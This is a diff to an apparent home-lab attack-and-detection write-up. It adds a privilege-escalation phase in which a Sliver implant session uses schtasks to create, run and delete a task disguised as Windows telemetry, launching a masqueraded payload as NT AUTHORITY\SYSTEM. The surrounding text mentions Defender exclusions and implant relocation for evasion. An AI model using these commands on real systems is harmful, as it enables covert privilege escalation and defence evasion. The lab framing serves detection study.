@@ -119,6 +119,31 @@ sliver > http  # Start HTTP listener
 
 A Sliver session opened on the attacker machine. Commands like `shell`, registry modifications, and process injection were attempted — **all detected by Wazuh/Sysmon**.
 
+
+### Phase 3b — Privilege Escalation to SYSTEM (Scheduled Task Abuse)
+
+With an admin session open, `getsystem` in Sliver failed to produce a SYSTEM
+shell. Instead, a scheduled task was used to spawn a process under
+`NT AUTHORITY\SYSTEM`:
+
+\```cmd
+# Create a one-time task running as SYSTEM
+schtasks /create /tn "WindowsTelemetryUpdate" /tr "C:\Windows\Temp\DiagTrackHost.exe" /sc once /st 00:00 /ru "NT AUTHORITY\SYSTEM" /f
+
+# Force immediate execution
+schtasks /run /tn "WindowsTelemetryUpdate" /f
+
+# Clean up the task (payload stays in memory)
+schtasks /delete /tn "WindowsTelemetryUpdate" /f
+\```
+
+**Why it works:** Windows treats scheduled task creation by an admin as routine
+activity. Running a task as `NT AUTHORITY\SYSTEM` causes Windows to spawn the
+process with a SYSTEM token, effectively escalating privileges without any
+exploit.
+
+**MITRE ATT&CK:** T1053.005 — Scheduled Task/Job
+
 ### Phase 4 — Evasion & Relocation
 
 With Wazuh Manager temporarily stopped (simulating a detection gap), the implant was relocated to a less-monitored directory and added to Windows Defender exclusions:
